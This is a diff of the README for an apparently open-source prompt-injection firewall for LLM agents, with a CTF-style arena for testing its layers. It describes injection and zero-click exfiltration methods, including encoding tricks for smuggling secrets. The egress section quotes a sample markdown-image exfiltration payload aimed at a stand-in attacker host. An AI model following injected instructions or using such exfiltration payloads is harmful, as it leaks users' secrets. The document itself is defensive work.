@@ -5,15 +5,15 @@
 [![Python](https://img.shields.io/badge/Python-3.13%2B-3776AB?style=flat&logo=python&logoColor=white)](https://www.python.org)
 [![Docker](https://img.shields.io/badge/Docker-2496ED?style=flat&logo=docker&logoColor=white)](https://www.docker.com)
 [![OWASP](https://img.shields.io/badge/OWASP-LLM01%3A2025-000000?style=flat)](https://genai.owasp.org)
-[![Layers](https://img.shields.io/badge/layers-4%20invariant%20%2B%201%20scored-6D4AFF?style=flat)](#the-five-layers)
-[![Detection](https://img.shields.io/badge/detection-100%25%20%2F%2011%20classes-4457E8?style=flat)](#the-numbers-and-what-they-are-worth)
+[![Layers](https://img.shields.io/badge/layers-3%20invariant%20%2B%202%20scored%20%2B%20prepass-6D4AFF?style=flat)](#the-five-layers)
+[![Detection](https://img.shields.io/badge/detection-100%25%20%2F%2021%20classes-4457E8?style=flat)](#the-numbers-and-what-they-are-worth)
 [![False positives](https://img.shields.io/badge/hard--benign%20FPR-4.0%25-orange?style=flat)](#the-numbers-and-what-they-are-worth)
-[![Tests](https://img.shields.io/badge/tests-186%20passed-8B5CF6?style=flat)](#build-and-test)
+[![Tests](https://img.shields.io/badge/tests-202%20passed-8B5CF6?style=flat)](#build-and-test)
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
 
 ---
 
-> A prompt injection firewall that gives up on reading the attacker's mind and enforces structure around the model instead. Untrusted content is fenced behind a per-request nonce it cannot guess, the model's tool calls are authorized by causal taint rather than requested-and-granted, and registered secrets are intercepted on the way out across a transitive closure over every reversible encoding. Scored text inspection ships too—labelled best-effort—because it catches the copy-pasted eighty percent. It runs keyless and offline, ships an OpenAI-compatible proxy, and includes a six-level challenge arena where each level is a firewall policy configuration so you can experience which layer stopped you.
+> A prompt injection firewall that gives up on reading the attacker's mind and enforces structure around the model instead. Untrusted content is fenced behind a per-request nonce it cannot guess, the model's tool calls are authorized by causal taint rather than requested-and-granted, and registered secrets are intercepted on the way out across a bounded set of reversible encodings. Scored text inspection ships too—labelled best-effort—because it catches the copy-pasted eighty percent. It runs keyless and offline, ships an OpenAI-compatible proxy, and includes a six-level challenge arena where each level is a firewall policy configuration so you can experience which layer stopped you.
 
 ---
 
@@ -27,7 +27,7 @@ So this takes the other position. **The model is untrusted, and the firewall enf
 
 1. **Untrusted content can never be promoted to instruction.**
 2. **The model requests actions, the firewall authorizes them.**
-3. **Registered secrets do not leave, in any encoding.**
+3. **Registered secrets are checked against supported encodings before output is released.**
 
 The LLM cannot be sandboxed from within its own token space. So you sandbox the structure and the effects.
 
@@ -45,7 +45,7 @@ Text inspection still ships, because raising the cost of naive copy-pasted attac
 | `toolauth` | invariant | Causal taint propagation, guard requirements (`NO_UNTRUSTED_INFLUENCE`), forbidden effects, argument schema. |
 | `egress` | invariant | Canary matching under obfuscation across transitive readings closure, URL allowlists, and markdown-image exfiltration control. |
 
-The four invariant layers never read payload semantics to make their decision. `toolauth` refuses a tool because the context was tainted by retrieved data, not because the request looked suspicious. `egress` blocks a URL because the host is not allowlisted, not because the URL seemed sketchy. That is what makes them hold against an attacker who paraphrases.
+The three invariant layers never read payload semantics to make their decision. `toolauth` refuses a tool because the context was tainted by retrieved data, not because the request looked suspicious. `egress` blocks a URL because the host is not allowlisted, not because the URL seemed sketchy. That is what makes them hold against an attacker who paraphrases.
 
 ### Provenance is the load-bearing one
 
@@ -68,13 +68,13 @@ ctx = (
 <<<END-a3f9c1e0d47b2856>>>
 ```
 
-A static delimiter (like `---BEGIN DOCUMENT---`) is forgeable by anyone who has read your source code or documentation. A per-request cryptographic nonce is not. If the nonce appears inside raw `DATA` at all, that is a `CRITICAL` invariant violation: external content has no legitimate way to know a nonce generated after the document was created.
+A static delimiter (like `---BEGIN DOCUMENT---`) is forgeable by anyone who has read your source code or documentation. A per-request cryptographic nonce is not. If the matching closing fence appears inside raw `DATA`, that is a `CRITICAL` invariant violation: external content has no legitimate way to know a nonce generated after the document was created.
 
 ---
 
 ## What it is
 
-Every capability below is exercised by 186 unit and integration tests, an offline security benchmark over 11 attack classes and 2 separated benign corpora, and a per-layer ablation that fails the suite if any layer turns out to be doing nothing.
+Every capability below is exercised by 202 unit and integration tests, an offline security benchmark over 11 attack classes and 2 separated benign corpora, and a per-layer ablation that fails the suite if any layer turns out to be doing nothing.
 
 ### 1. A normalization pre-pass that reports instead of deciding
 - Recovers payloads hidden in the Unicode tag block (`U+E0000`–`U+E007F`), which render invisibly in user interfaces but survive tokenization intact.
@@ -95,8 +95,8 @@ Every capability below is exercised by 186 unit and integration tests, an offlin
 - Arguments validate against strict schemas; malformed parameters trigger a deterministic `Decision.BLOCK` rather than uncaught runtime exceptions.
 - This is the layer that stops zero-click exfiltration of the *EchoLeak* shape, and almost no comparable guardrail project implements it.
 
-### 4. Egress that matches secrets across all reversible encodings
-- One mechanism, not one rule per variant: computes a transitive closure (`readings()`) across every reversible transform (unwrapping, whitespace stripping, separator removal, hex, rot13, reversal) and matches registered canaries against the entire closure.
+### 4. Egress that matches secrets across supported reversible encodings
+- One mechanism, not one rule per variant: computes a transitive closure (`readings()`) across the configured reversible transforms (unwrapping, whitespace stripping, separator removal, hex, rot13, reversal) and matches registered canaries against the entire closure.
 - A fixed sequential pipeline fails here, because inverse ordering depends on the attacker's encoding sequence: `base64("-".join(secret))` requires unwrap-then-strip, whereas `"-".join(base64(secret))` requires strip-then-unwrap.
 - Any outbound URL whose host is not on the strict allowlist is a hard block, including protocol-relative URLs (`//evil.com`) and dot-boundary enforcement (so `.example.com` matches `api.example.com` but rejects `evilexample.com`).
 - Markdown images are treated as links, defending against zero-click exfiltration (`![exfil](https://attacker.com/leak?q=DATA)`) where the client application renders an image tag and transmits data without user interaction.
@@ -117,7 +117,7 @@ Every capability below is exercised by 186 unit and integration tests, an offlin
 - The test harness ships with a deterministic offline mock agent that complies with any imperative instruction it encounters, holds canary secrets, and attempts exfiltration via tool calls. If a secret leaks, the firewall failed—there is no "the model was nondeterministic" excuse.
 - Six levels, each a **firewall policy configuration rather than a difficulty slider**. Level 1 has all protections disabled; each subsequent level activates one additional layer, naming the specific rule that stopped the attack.
 - Containment is evaluated across reply prose **and** tool call arguments, because naive text-only checks report containment while secrets escape inside tool arguments.
-- Ephemeral sessions, client rate limits, in-memory TTL expiration, and zero external network dependencies.
+- Ephemeral sessions, per-session attempt limits, in-memory TTL expiration, and zero external network dependencies.
 
 ---
 
@@ -198,6 +198,39 @@ docker compose up --build
 ```
 Open `http://localhost:18443` in your browser. Each level (1 through 6) activates one more layer of defense.
 
+### Develop the workbench
+
+```bash
+uv run uvicorn main:app --reload --port 8000
+```
+
+Open `http://localhost:8000`. The frontend is plain HTML, CSS, and JavaScript in
+`arena/static/`; there is no Node build or frontend framework to maintain. Restart
+or reload after edits. The API loads policy YAML once when the app is created.
+Vercel's bundle explicitly includes the static files and policy YAML.
+
+The workbench supports six policy configurations, benign/direct/encoded starter
+payloads, Ctrl/Cmd+Enter, separate leaked/blocked/allowed outcomes, inspection
+findings, the latest ten attempts, and downloadable JSON reports. Drafts and
+history stay in browser memory; reloads clear them. New session clears history
+but keeps your draft and selected policy. The server validates the 4,000-codepoint
+payload limit before normalization, and invalid submissions do not spend attempts.
+
+**Deployment boundaries:** sessions are intentionally in-memory, with a per-session
+attempt cap rather than a per-person or per-IP rate limit. Vercel cold starts,
+restarts, and multiple instances can lose or disagree about sessions. The UI offers
+an explicit new-session recovery without silently resubmitting an attack. A shared
+TTL-backed session store and atomic attempt accounting are needed for reliable
+multi-instance hosting; add platform rate limiting for an internet-facing service.
+Local bypass JSONL files are also not durable on serverless hosting. Raw bypass
+records are no longer served at `/api/bypasses` because they contain submitted
+payloads, session identifiers, and simulated secrets. Review local records with
+`uv run python -m arena.harvest`.
+
+The interface uses Google Fonts with system fallbacks; the firewall and simulated
+agent need no model keys or outbound model requests. This is an educational arena,
+not a production security boundary or an independently validated security product.
+
 ### Run the Proxy
 
 ```bash
@@ -210,7 +243,7 @@ Point any OpenAI-compatible SDK at `http://localhost:8000/v1` to inspect request
 ## Build and test
 
 ```bash
-# Full quality gate: format check, linting, strict mypy, 186 pytest, and benchmark
+# Full quality gate: format check, linting, strict mypy, 202 pytest, and benchmark
 make check
 
 # Or individual tools:
@@ -232,8 +265,8 @@ Container port allocations:
 Stated plainly here rather than discovered in production:
 
 - **Ingress detection is incomplete by construction.** An adversary with enough time will paraphrase around heuristic regexes. Ingress exists to catch copy-pasted baseline attempts and raise attacker cost; it is scored rather than invariant for this exact reason.
-- **The proxy's inferred provenance is wrong for standard RAG pipelines.** Retrieved content dumped into a `user` turn is inferred as `Trust.USER`, so request-side ingress heuristics do not inspect it. The response-side invariant layers (`toolauth` and `egress`) still hold, but the Python library API is the only mode where provenance is declared accurately.
-- **Prior assistant turns map to USER, not DATA.** Classifying previous assistant turns as untrusted `DATA` would taint every multi-turn conversation after turn one and render tool authorization unusable in proxy mode. Determining taint decay across multi-turn dialogues remains an unsolved problem.
+- **The proxy's inferred provenance is wrong for standard RAG pipelines.** Retrieved content dumped into a `user` turn is inferred as `Trust.USER`, so request-side ingress heuristics do not inspect it. The proxy response-side egress checks still run; tool authorization must be enforced separately by the host, but the Python library API is the only mode where provenance is declared accurately.
+- **Prior assistant turns currently map to DATA.** The proxy conservatively treats assistant history as untrusted content. This can produce false positives in multi-turn conversations; use the explicit Context API when the host can accurately declare provenance.
 - **Does not defend a model whose weights or system prompt the attacker controls.** If the attacker dictates the model weights or primary instructions, they are already inside the security perimeter.
 - **No LLM-as-judge in the core evaluation path.** An LLM judge is itself vulnerable to prompt injection, introduces non-deterministic latency, and inflates operational cost.
 - **This is not a content moderation filter.** Spanguard detects prompt injection and unauthorized exfiltration. It does not perform toxicity, sentiment, or profanity filtering.
@@ -246,7 +279,8 @@ Stated plainly here rather than discovered in production:
 llm-provenance-guard/
 ├── .github/workflows/ci.yml # GitHub Actions CI pipeline
 ├── arena/                  # 6-Level CTF Challenge Arena (FastAPI backend)
-│   ├── app.py              # Web UI & attempt endpoints
+│   ├── app.py              # Static UI serving & validated attempt endpoints
+│   ├── static/             # Workbench HTML, CSS, and browser JavaScript
 │   ├── containment.py      # Egress containment oracle
 │   ├── engine.py           # Evaluation runner
 │   ├── harvest.py          # Bypass recording & harvesting
@@ -270,7 +304,7 @@ llm-provenance-guard/
 │   ├── policy.py           # Policy model & invariant-priority decision algebra
 │   ├── tools.py            # Tool definitions, Effect enum & Guard enum
 │   └── verdict.py          # Verdict, Finding, Severity, Decision models
-├── tests/                  # 186 unit, integration & property tests
+├── tests/                  # 202 unit, integration & property tests
 ├── Dockerfile              # Hardened multi-stage unprivileged container
 ├── docker-compose.yml      # Read-only rootfs & dropped capabilities compose
 ├── pyproject.toml          # Strict mypy & ruff configuration
